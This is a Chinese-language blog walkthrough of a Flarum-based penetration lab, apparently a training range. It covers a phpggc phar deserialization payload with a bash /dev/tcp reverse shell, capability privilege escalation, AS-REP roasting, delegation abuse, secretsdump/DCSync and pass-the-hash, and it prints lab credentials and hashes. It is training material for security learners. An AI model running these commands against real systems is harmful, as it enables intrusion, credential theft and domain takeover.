<!DOCTYPE html>
<html lang="zh-cn">
  <head>
    
    <script type="application/ld+json">

{  
  "@context":"http://schema.org",
  "@type":"Website",
  "@id":"https:\/\/gkjzjh146.github.io\/",
  "author": {
    "@type": "Person",
    "name": "gkjzjh146",
    
    "image": "https://gkjzjh146.github.io/images/1.jpg"
    
  },
  "name":"gkjzjh146",
  "description":"",
  "url":"https:\/\/gkjzjh146.github.io\/post\/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-flarum\/",
  "keywords":"[春秋云境, Flarum]"
}

</script>
    <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="generator" content="Hugo 0.115.4 with theme Tranquilpeak 0.5.3-BETA">
<meta name="author" content="gkjzjh146">
<meta name="keywords" content="春秋云境, Flarum">
<meta name="description" content="">


<meta property="og:description" content="">
<meta property="og:type" content="article">
<meta property="og:title" content="春秋云境-Flarum">
<meta name="twitter:title" content="春秋云境-Flarum">
<meta property="og:url" content="https://gkjzjh146.github.io/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-flarum/">
<meta property="twitter:url" content="https://gkjzjh146.github.io/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-flarum/">
<meta property="og:site_name" content="gkjzjh146">
<meta property="og:description" content="">
<meta name="twitter:description" content="">
<meta property="og:locale" content="zh-cn">

  
    <meta property="article:published_time" content="2023-10-07T10:21:16">
  
  
    <meta property="article:modified_time" content="2023-10-07T10:21:16">
  
  
  
    
      <meta property="article:section" content="渗透">
    
  
  
    
      <meta property="article:tag" content="春秋云境">
    
      <meta property="article:tag" content="wp">
    
  


<meta name="twitter:card" content="summary">







  <meta property="og:image" content="https://gkjzjh146.github.io/images/1.jpg">
  <meta property="twitter:image" content="https://gkjzjh146.github.io/images/1.jpg">




  <meta property="og:image" content="https://gkjzjh146.github.io/8.jpeg">
  <meta property="twitter:image" content="https://gkjzjh146.github.io/8.jpeg">


  <meta property="og:image" content="https://gkjzjh146.github.io/Flarum.png">
  <meta property="twitter:image" content="https://gkjzjh146.github.io/Flarum.png">


    <title>春秋云境-Flarum</title>

    <link rel="icon" href="https://gkjzjh146.github.io/images/1.jpg">
    

    

    <link rel="canonical" href="https://gkjzjh146.github.io/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-flarum/">
    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <meta name="referrer" content="no-referrer-when-downgrade">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css" integrity="sha512-H9jrZiiopUdsLpg94A333EfumgUBpO9MdbxStdeITo+KEIMaNfHNvwyjjDJb+ERPaRS6DpyRlKbvPUasNItRyw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    
    
    
    <link rel="stylesheet" href="https://gkjzjh146.github.io/css/style-h6ccsoet3mzkbb0wngshlfbaweimexgqcxj0h5hu4h82olsdzz6wmqdkajm.min.css" />
    
    

    
      
    
    
  </head>

  <body>
    <div id="blog">
      <header id="header" data-behavior="4">
  <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
  <div class="header-title">
    <a class="header-title-link" href="https://gkjzjh146.github.io/" aria-label="去首页">gkjzjh146</a>
  </div>
  
    
      <a class="header-right-picture "
         href="https://gkjzjh146.github.io/#about" aria-label="打开链接: /#about">
    
    
    
      
        <img class="header-picture" src="https://gkjzjh146.github.io/images/1.jpg" alt="作者的图片" />
      
    
    </a>
  
</header>

      <nav id="sidebar" data-behavior="4">
  <div class="sidebar-container">
    
      <div class="sidebar-profile">
        <a href="https://gkjzjh146.github.io/#about" aria-label="阅读有关作者的更多信息">
          <img class="sidebar-profile-picture" src="https://gkjzjh146.github.io/images/1.jpg" alt="作者的图片" />
        </a>
        <h4 class="sidebar-profile-name">gkjzjh146</h4>
        
          <h5 class="sidebar-profile-bio">会点web，会点misc</h5>
        
      </div>
    
    <ul class="sidebar-buttons">
      
  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://gkjzjh146.github.io/" title="Home">
    
      <i class="sidebar-button-icon fas fa-lg fa-home" aria-hidden="true"></i>
      
      <span class="sidebar-button-desc">首页</span>
    </a>
  </li>

  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://gkjzjh146.github.io/categories" title="Categories">
    
      <i class="sidebar-button-icon fas fa-lg fa-bookmark" aria-hidden="true"></i>
      
      <span class="sidebar-button-desc">分类</span>
    </a>
  </li>

  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://gkjzjh146.github.io/tags" title="Tags">
    
      <i class="sidebar-button-icon fas fa-lg fa-tags" aria-hidden="true"></i>
      
      <span class="sidebar-button-desc">标签</span>
    </a>
  </li>

  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://gkjzjh146.github.io/archives" title="Archives">
    
      <i class="sidebar-button-icon fas fa-lg fa-archive" aria-hidden="true"></i>
      
      <span class="sidebar-button-desc">归档</span>
    </a>
  </li>

  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://gkjzjh146.github.io/#about" title="About">
    
      <i class="sidebar-button-icon fas fa-lg fa-question" aria-hidden="true"></i>
      
      <span class="sidebar-button-desc">关于</span>
    </a>
  </li>


    </ul>
    <ul class="sidebar-buttons">
      

    </ul>
    <ul class="sidebar-buttons">
      

    </ul>
  </div>
</nav>

      
  <div class="post-header-cover
              text-center
              "
       style="background-image:url('/8.jpeg')"
       data-behavior="4">
    
      <div class="post-header main-content-wrap text-center">
  
    <h1 class="post-title">
      春秋云境-Flarum
    </h1>
  
  
  <div class="postShorten-meta post-meta">
    
      <time datetime="2023-10-07T10:21:16&#43;08:00">
        
  十月 7, 2023

      </time>
    
    
  
  
    <span>发布在</span>
    
      <a class="category-link" href="https://gkjzjh146.github.io/categories/%e6%b8%97%e9%80%8f">渗透</a>
    
  

  </div>

</div>
    
  </div>


      <div id="main" data-behavior="4"
        class="hasCover
               hasCoverMetaIn
               ">
        <article class="post" id="top">
          
          
          <div class="post-content markdown">
            <div class="main-content-wrap">
              <h1 id="table-of-contents">目录</h1>
<nav id="TableOfContents">
  <ul>
    <li><a href="#flag1">flag1</a></li>
    <li><a href="#flag3">flag3</a></li>
    <li><a href="#flag2flag4">flag2&amp;flag4</a></li>
  </ul>
</nav>

<h1 id="flag1">flag1</h1>
<pre tabindex="0"><code>fscan64 -h 39.99.149.140
</code></pre><pre tabindex="0"><code>
   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| &#39;__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.2
start infoscan
(icmp) Target 39.99.149.140   is alive
[*] Icmp alive hosts len is: 1
39.99.149.140:22 open
39.99.149.140:80 open
[*] alive ports len is: 2
start vulscan
[*] WebTitle: http://39.99.149.140      code:200 len:5882   title:霄壤社区
已完成 2/2
[*] 扫描结束,耗时: 39.6581717s
</code></pre><p><img src="https://gkjzjh146.github.io/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Flarum.assets/image-20231007102416541.png" alt="image-20231007102416541"></p>
<p>账号是administrator或者是administrator@xiaorang.lab,密码用rockyou来爆，要爆破挺久的，密码是1chris</p>
<p>然后看p牛文章</p>
<p><a href="https://tttang.com/archive/1714/">https://tttang.com/archive/1714/</a></p>
<p><a href="https://github.com/ambionics/phpggc">https://github.com/ambionics/phpggc</a></p>
<pre tabindex="0"><code>php phpggc -p tar -b Monolog/RCE6 system &#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#39;&#34;
</code></pre><pre tabindex="0"><code>@import (inline) &#39;data:text/css;base64,dGVzdC50e...
</code></pre><p><img src="https://gkjzjh146.github.io/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Flarum.assets/image-20231007102722312.png" alt="image-20231007102722312"></p>
<p><img src="https://gkjzjh146.github.io/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Flarum.assets/image-20231007152714345.png" alt="image-20231007152714345"></p>
<pre tabindex="0"><code>http://39.99.150.80/
</code></pre><p>访问一下，phar内容成功写入</p>
<p><img src="https://gkjzjh146.github.io/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Flarum.assets/image-20231007110226145.png" alt="image-20231007110226145"></p>
<p>触发</p>
<pre tabindex="0"><code>.test {
  content: data-uri(&#34;phar://./assets/forum.css&#34;);
}
</code></pre><p><img src="https://gkjzjh146.github.io/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Flarum.assets/image-20231007110349009.png" alt="image-20231007110349009"></p>
<p>反弹shell</p>
<p><img src="https://gkjzjh146.github.io/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Flarum.assets/image-20231007110415633.png" alt="image-20231007110415633"></p>
<p><img src="https://gkjzjh146.github.io/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Flarum.assets/image-20231007153333518.png" alt="image-20231007153333518"></p>
<p>写个shell</p>
<p>capabilities提权</p>
<pre tabindex="0"><code>getcap -r / 2&gt;/dev/null
</code></pre><p><img src="https://gkjzjh146.github.io/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Flarum.assets/image-20231007110614372.png" alt="image-20231007110614372"></p>
<pre tabindex="0"><code>cd /
openssl req -x509 -newkey rsa:2048 -keyout /tmp/key.pem -out /tmp/cert.pem -days 365 -nodes
openssl s_server -key /tmp/key.pem -cert /tmp/cert.pem -port 8084 -HTTP
</code></pre><p>上面第二条命令要在反弹shell中运行，要选择信息什么的，直接回车就行了</p>
<p><img src="https://gkjzjh146.github.io/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Flarum.assets/image-20231007155226428.png" alt="image-20231007155226428"></p>
<pre tabindex="0"><code>curl --http0.9 -k &#34;https://127.0.0.1:8084/root/flag/flag01.txt&#34;
</code></pre><p><img src="https://gkjzjh146.github.io/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Flarum.assets/image-20231007155219042.png" alt="image-20231007155219042"></p>
<h1 id="flag3">flag3</h1>
<pre tabindex="0"><code>(www-data:/tmp) $ ifconfig
eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
        inet 172.22.60.52  netmask 255.255.0.0  broadcast 172.22.255.255
        inet6 fe80::216:3eff:fe1a:a30c  prefixlen 64  scopeid 0x20&lt;link&gt;
        ether 00:16:3e:1a:a3:0c  txqueuelen 1000  (Ethernet)
        RX packets 210517  bytes 298508456 (298.5 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 42694  bytes 7131835 (7.1 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 1211  bytes 126101 (126.1 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1211  bytes 126101 (126.1 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
</code></pre><p>上传fscan</p>
<pre tabindex="0"><code>chmod +x fscan
./fscan -h 172.22.60.52/24
</code></pre><pre tabindex="0"><code>172.22.60.42:445 open
172.22.60.15:445 open
172.22.60.42:139 open
172.22.60.8:139 open
172.22.60.15:139 open
172.22.60.42:135 open
172.22.60.15:135 open
172.22.60.8:135 open
172.22.60.52:80 open
172.22.60.52:22 open
172.22.60.52:8084 open
172.22.60.52:8083 open
172.22.60.8:88 open
172.22.60.8:445 open
172.22.60.52:8080 open
[*] NetInfo:
[*]172.22.60.15
   [-&gt;]PC1
   [-&gt;]172.22.60.15
   [-&gt;]169.254.204.42
[*] NetBios: 172.22.60.15    XIAORANG\PC1                   
[*] NetBios: 172.22.60.8     [+]DC XIAORANG\DC              
[*] NetInfo:
[*]172.22.60.42
   [-&gt;]Fileserver
   [-&gt;]172.22.60.42
   [-&gt;]169.254.134.157
[*] WebTitle: https://172.22.60.52:8080 code:200 len:260    title:None
[*] NetInfo:
[*]172.22.60.8
   [-&gt;]DC
   [-&gt;]172.22.60.8
   [-&gt;]169.254.114.245
[*] WebTitle: https://172.22.60.52:8084 code:200 len:260    title:None
[*] NetBios: 172.22.60.42    XIAORANG\FILESERVER            
[*] WebTitle: https://172.22.60.52:8083 code:200 len:260    title:None
[*] WebTitle: http://172.22.60.52       code:200 len:5867   title:霄壤社区
</code></pre><p>整理一下</p>
<pre tabindex="0"><code>172.22.60.52 本机
172.22.60.15 PC1
172.22.60.42 Fileserver
172.22.60.8 DC
</code></pre><p>翻一下52的文件，看到config.php，找到数据库密码</p>
<p><img src="https://gkjzjh146.github.io/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Flarum.assets/image-20231007155804192.png" alt="image-20231007155804192"></p>
<pre tabindex="0"><code>root/Mysql@root123
</code></pre><p>连接一下</p>
<p><img src="https://gkjzjh146.github.io/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Flarum.assets/image-20231007155958877.png" alt="image-20231007155958877"></p>
<p><img src="https://gkjzjh146.github.io/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Flarum.assets/image-20231007160131284.png" alt="image-20231007160131284"></p>
<p>根据题目描述, 需要拿到域用户凭据</p>
<p>mysql 导出 flarum 用户的用户名</p>
<pre tabindex="0"><code>proxychains impacket-GetNPUsers -dc-ip 172.22.60.8 xiaorang.lab/ -usersfile user.txt -request -outputfile hash.txt
</code></pre><pre tabindex="0"><code>$krb5asrep$23$wangyun@XIAORANG.LAB:9a278cb217eb27d2afa8beac2d895c2c$ae11843f77f67890957509455634baae4abbd2b9cbc8d6ec254fe5c17de670dca3c89853594ba5fa0b68fd8b04de430ca76188d6d2cf7fe1c98b1916c3f92a6abb59a0ecba95439e44c5ffeed3699b10a0ae3f4e109ba3789131d38881ad32fff1b97ba8edb16d383e66db2510b8f0ec0bfcf26953f40b14ec6da52fd22339dfb95fdc9581428f6cb1833a16b10f31753d887676a900c82b012a43a9864c54945ab046cb48a1794db0cec24076a0816689cc72ae7e58bb98cb67958d6621548fc5c469ff8fc9b2cc8c75ed87b959d3f9ca48889ca5bca188baf8f843947dcc9345caa5c0e9f34b326e690875
$krb5asrep$23$zhangxin@XIAORANG.LAB:afa677fae6d386861fe4be942be07e5f$4fb3780270b5b62a22f0c55cb4b2925b091228cfb3577a2fed4b91a5574872978825233e728c9f2c9407473040fd74411c6ae826082179c6e3cb2ec977093b9668e332655d0ad40384fa90880dabd51b3bb136f777e57c40ca31313229021e70e29b676c26c32286c33cce5615fa37bc874ba63097dbcb4a8c6871cbcdf5c100565ddd06c154789569b64482f46f2216d6ac0cc062e72c95bc1b93cbae0cc2b6c5c4d9cf14b151892d7cef6acec3857fc2ebc4278dfbf46dbe77a6283aaf3f875b938bfdd207180c76ff8652a18dc1c59770e79885a1cd813834de892e85f9f054a21349348bca49e29231c3
</code></pre><p>爆破一下hash</p>
<pre tabindex="0"><code>hashcat64 -a 0 -m 18200 --force hash.txt rockyou.txt
</code></pre><pre tabindex="0"><code>wangyun/Adm12geC
zhangxin爆不出来
</code></pre><p>wangyun可以连接上15这台机器</p>
<p>登录是用这个</p>
<pre tabindex="0"><code>wangyun@xiaorang.lab/Adm12geC
</code></pre><p>登录后发现一个xshell7，里面有个会话</p>
<p><img src="https://gkjzjh146.github.io/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Flarum.assets/image-20231007163249592.png" alt="image-20231007163249592"></p>
<p>并且该会话还存储了zhangxin密码</p>
<p>用SharpXDecrypt工具提取Xshell中的密码：</p>
<p><img src="https://gkjzjh146.github.io/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Flarum.assets/image-20231007163655767.png" alt="image-20231007163655767"></p>
<pre tabindex="0"><code>UserName: zhangxin
Password: admin4qwY38cc
</code></pre><p>在172.22.60.15机器上登录zhangxin用户，用SharpHound收集域内信息</p>
<pre tabindex="0"><code>zhangxin@xiaorang.lab/admin4qwY38cc
</code></pre><pre tabindex="0"><code>SharpHound.exe -c all
</code></pre><p>将上述结果放到本地BloodHound分析，发现zhangxin用户是ACCOUNT OPERATORS组的，并且我们已经有了zhangxin用户，因此可以利用基于资源的约束委派做本地提权</p>
<p><a href="https://fushuling.com/index.php/2023/09/30/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%C2%B7flarum/">春秋云境·Flarum – fushulingのblog</a></p>
<p>看佬的博客</p>
<pre tabindex="0"><code>PS C:\Users\zhangxin\Desktop&gt;  Set-ExecutionPolicy Bypass -Scope Process

执行策略更改
执行策略可帮助你防止执行不信任的脚本。更改执行策略可能会产生安全风险，如 https:/go.microsoft.com/fwlink/?LinkID=135170
中的 about_Execution_Policies 帮助主题所述。是否要更改执行策略?
[Y] 是(Y)  [A] 全是(A)  [N] 否(N)  [L] 全否(L)  [S] 暂停(S)  [?] 帮助 (默认值为“N”): Y
PS C:\Users\zhangxin\Desktop&gt; import-module .\Powermad.ps1
PS C:\Users\zhangxin\Desktop&gt;  New-MachineAccount -MachineAccount test -Password $(ConvertTo-SecureString &#34;123456&#34; -AsPlainText -Force)
[+] Machine account test added
</code></pre><pre tabindex="0"><code>PS C:\Users\zhangxin\Desktop&gt; import-module .\powerview.ps1
PS C:\Users\zhangxin\Desktop&gt; Get-NetComputer test -Properties objectsid

objectsid
---------
S-1-5-21-3535393121-624993632-895678587-1116
</code></pre><pre tabindex="0"><code>PS C:\Users\zhangxin\Desktop&gt; $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &#34;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3535393121-624993632-895678587-1116)&#34;
PS C:\Users\zhangxin\Desktop&gt;  $SDBytes = New-Object byte[] ($SD.BinaryLength)
PS C:\Users\zhangxin\Desktop&gt;  $SD.GetBinaryForm($SDBytes, 0)
PS C:\Users\zhangxin\Desktop&gt; Get-DomainComputer Fileserver| Set-DomainObject -Set @{&#39;msds-allowedtoactonbehalfofotheridentity&#39;=$SDBytes} -Verbose
详细信息: [Get-DomainSearcher] search base: LDAP://DC.XIAORANG.LAB/DC=XIAORANG,DC=LAB
详细信息: [Get-DomainObject] Extracted domain &#39;xiaorang.lab&#39; from &#39;CN=FILESERVER,CN=Computers,DC=xiaorang,DC=lab&#39;
详细信息: [Get-DomainSearcher] search base: LDAP://DC.XIAORANG.LAB/DC=xiaorang,DC=lab
详细信息: [Get-DomainObject] Get-DomainObject filter string:
(&amp;(|(distinguishedname=CN=FILESERVER,CN=Computers,DC=xiaorang,DC=lab)))
详细信息: [Set-DomainObject] Setting &#39;msds-allowedtoactonbehalfofotheridentity&#39; to &#39;1 0 4 128 20 0 0 0 0 0 0 0 0 0 0 0
36 0 0 0 1 2 0 0 0 0 0 5 32 0 0 0 32 2 0 0 2 0 44 0 1 0 0 0 0 0 36 0 255 1 15 0 1 5 0 0 0 0 0 5 21 0 0 0 97 209 185 210
 96 165 64 37 123 248 98 53 92 4 0 0&#39; for object &#39;FILESERVER$&#39;
</code></pre><p>修改/etc/hosts</p>
<pre tabindex="0"><code>172.22.15.35 XR-0687.xiaorang.lab
172.22.15.35 XR-DC01.xiaorang.lab
172.22.60.15 PC.xiaorang.lab
172.22.60.42 FILESERVER.xiaorang.lab
</code></pre><pre tabindex="0"><code>proxychains impacket-getST -dc-ip 172.22.60.8 xiaorang.lab/test\$:123456 -spn cifs/Fileserver.xiaorang.lab -impersonate administrator

export KRB5CCNAME=administrator.ccache

proxychains impacket-psexec Administrator@FILESERVER.xiaorang.lab -k -no-pass -dc-ip 172.22.60.8 -codec gbk
</code></pre><p><img src="https://gkjzjh146.github.io/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Flarum.assets/image-20231007201157086.png" alt="image-20231007201157086"></p>
<h1 id="flag2flag4">flag2&amp;flag4</h1>
<p>在刚刚那个运行目录下,抓取hash</p>
<pre tabindex="0"><code>proxychains impacket-secretsdump -k -no-pass  FILESERVER.xiaorang.lab -dc-ip 172.22.60.8
</code></pre><pre tabindex="0"><code>[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xef418f88c0327e5815e32083619efdf5
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:bd8e2e150f44ea79fff5034cad4539fc:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:b40dda6fd91a2212d118d83e94b61b11:::
[*] Dumping cached domain logon information (domain/username:hash)
XIAORANG.LAB/Administrator:$DCC2$10240#Administrator#f9224930044d24598d509aeb1a015766: (2023-08-02 07:52:21)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
XIAORANG\Fileserver$:plain_password_hex:3000310078005b003b0049004e003500450067003e00300039003f0074006c00630024003500450023002800220076003c004b0057005e0063006b005100580024007300620053002e0038002c0060003e00420021007200230030003700470051007200640054004e0078006000510070003300310074006d006b004c002e002f0059003b003f0059002a005d002900640040005b0071007a0070005d004000730066006f003b0042002300210022007400670045006d0023002a002800330073002c00320063004400720032002f003d0078006a002700550066006e002f003a002a0077006f0078002e0066003300
XIAORANG\Fileserver$:aad3b435b51404eeaad3b435b51404ee:951d8a9265dfb652f42e5c8c497d70dc:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x15367c548c55ac098c599b20b71d1c86a2c1f610
dpapi_userkey:0x28a7796c724094930fc4a3c5a099d0b89dccd6d1
[*] NL$KM 
 0000   8B 14 51 59 D7 67 45 80  9F 4A 54 4C 0D E1 D3 29   ..QY.gE..JTL...)
 0010   3E B6 CC 22 FF B7 C5 74  7F E4 B0 AD E7 FA 90 0D   &gt;..&#34;...t........
 0020   1B 77 20 D5 A6 67 31 E9  9E 38 DD 95 B0 60 32 C4   .w ..g1..8...`2.
 0030   BE 8E 72 4D 0D 90 01 7F  01 30 AC D7 F8 4C 2B 4A   ..rM.....0...L+J
NL$KM:8b145159d76745809f4a544c0de1d3293eb6cc22ffb7c5747fe4b0ade7fa900d1b7720d5a66731e99e38dd95b06032c4be8e724d0d90017f0130acd7f84c2b4a
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
</code></pre><p>利用 Fileserver 机器账户进行 DCSync</p>
<pre tabindex="0"><code>proxychains secretsdump.py xiaorang.lab/&#39;Fileserver$&#39;:@172.22.60.8 -hashes &#39;:951d8a9265dfb652f42e5c8c497d70dc&#39; -just-dc-user Administrator
</code></pre><p>拿到域控hash</p>
<pre tabindex="0"><code>Administrator:500:aad3b435b51404eeaad3b435b51404ee:c3cfdc08527ec4ab6aa3e630e79d349b:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:4502e83276d2275a8f22a0be848aee62471ba26d29e0a01e2e09ddda4ceea683
Administrator:aes128-cts-hmac-sha1-96:38496df9a109710192750f2fbdbe45b9
Administrator:des-cbc-md5:f72a9889a18cc408
[*] Cleaning up... 
</code></pre><p>后面横传即可</p>
<pre tabindex="0"><code>proxychains python3 wmiexec.py -hashes :c3cfdc08527ec4ab6aa3e630e79d349b Administrator@172.22.60.8 -codec gbk
</code></pre><p><img src="https://gkjzjh146.github.io/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Flarum.assets/image-20231007203158989.png" alt="image-20231007203158989"></p>
<pre tabindex="0"><code>flag{88ca30ba-8a1d-4249-9eff-1b6676540ad4}
</code></pre><pre tabindex="0"><code>proxychains python3 wmiexec.py -hashes :c3cfdc08527ec4ab6aa3e630e79d349b xiaorang.lab/Administrator@172.22.60.15 -codec gbk
</code></pre><p><img src="https://gkjzjh146.github.io/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Flarum.assets/image-20231007203455218.png" alt="image-20231007203455218"></p>
              


            </div>
          </div>
          <div id="post-footer" class="post-footer main-content-wrap">
            
              
                
                
                  <div class="post-footer-tags">
                    <span class="text-color-light text-small">标签</span><br/>
                    
  <a class="tag tag--primary tag--small" href="https://gkjzjh146.github.io/tags/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/">春秋云境</a>

  <a class="tag tag--primary tag--small" href="https://gkjzjh146.github.io/tags/wp/">wp</a>

                  </div>
                
              
            
            
<div class="post-actions-wrap">
  <nav >
    <ul class="post-actions post-action-nav">
      
        <li class="post-action">
          
            <a class="post-action-btn btn btn--disabled">
          
              <i class="fa fa-angle-left"></i>
              <span class="hide-xs hide-sm text-small icon-ml">下一篇</span>
            </a>
        </li>
        <li class="post-action">
          
            <a class="post-action-btn btn btn--default tooltip--top" href="https://gkjzjh146.github.io/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-privilege/" data-tooltip="春秋云境-Privilege" aria-label="上一篇: 春秋云境-Privilege">
          
              <span class="hide-xs hide-sm text-small icon-mr">上一篇</span>
              <i class="fa fa-angle-right"></i>
            </a>
        </li>
      
    </ul>
  </nav>
<ul class="post-actions post-action-share" >
  
    <li class="post-action hide-lg hide-md hide-sm">
      <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions" aria-label="分享这个帖子">
        <i class="fa fa-share-alt" aria-hidden="true"></i>
      </a>
    </li>
    
      <li class="post-action hide-xs">
        <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://gkjzjh146.github.io/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-flarum/" title="分享到 Facebook" aria-label="分享到 Facebook">
          <i class="fab fa-facebook-square" aria-hidden="true"></i>
        </a>
      </li>
    
      <li class="post-action hide-xs">
        <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://gkjzjh146.github.io/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-flarum/" title="分享到 Twitter" aria-label="分享到 Twitter">
          <i class="fab fa-twitter" aria-hidden="true"></i>
        </a>
      </li>
    
      <li class="post-action hide-xs">
        <a class="post-action-btn btn btn--default" target="new" href="https://www.linkedin.com/sharing/share-offsite/?url=https://gkjzjh146.github.io/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-flarum/" title="分享到 Linkedin" aria-label="分享到 Linkedin">
          <i class="fab fa-linkedin" aria-hidden="true"></i>
        </a>
      </li>
    
  
  
    <li class="post-action">
      <a class="post-action-btn btn btn--default" href="#disqus_thread" aria-label="发表评论">
        <i class="far fa-comment"></i>
      </a>
    </li>
  
  <li class="post-action">
    
      <a class="post-action-btn btn btn--default" href="#top" aria-label="回到顶部">
      <i class="fa fa-arrow-up" aria-hidden="true"></i>
    
    </a>
  </li>
</ul>
</div>


            
  
    <div id="disqus_thread">
      <noscript>Please enable JavaScript to view the comments powered by Disqus.</noscript>
    </div>
    <script type="text/javascript">
      var disqus_config = function() {
        this.page.url = 'https:\/\/gkjzjh146.github.io\/post\/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-flarum\/';
        
          this.page.identifier = '\/post\/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-flarum\/'
        
      };
      (function() {
        
        
        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
          document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
          return;
        }
        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
        var disqus_shortname = 'hugo-tranquilpeak-theme';
        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
      })();
    </script>
  


          </div>
        </article>
        <footer id="footer" class="main-content-wrap">
  <span class="copyrights">
    &copy; 2023 gkjzjh146. All Rights Reserved
  </span>
    <br>
    
    <div class="busuanzi-footer">
  <span id="busuanzi_container_site_pv">
    本站总访问量<span id="busuanzi_value_site_pv"></span>次
  </span>
        <span id="busuanzi_container_site_uv">
    本站访客数<span id="busuanzi_value_site_uv"></span>人次
  </span>
    </div></footer>

      </div>
      <div id="bottom-bar" class="post-bottom-bar" data-behavior="4">
        
<div class="post-actions-wrap">
  <nav >
    <ul class="post-actions post-action-nav">
      
        <li class="post-action">
          
            <a class="post-action-btn btn btn--disabled">
          
              <i class="fa fa-angle-left"></i>
              <span class="hide-xs hide-sm text-small icon-ml">下一篇</span>
            </a>
        </li>
        <li class="post-action">
          
            <a class="post-action-btn btn btn--default tooltip--top" href="https://gkjzjh146.github.io/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-privilege/" data-tooltip="春秋云境-Privilege" aria-label="上一篇: 春秋云境-Privilege">
          
              <span class="hide-xs hide-sm text-small icon-mr">上一篇</span>
              <i class="fa fa-angle-right"></i>
            </a>
        </li>
      
    </ul>
  </nav>
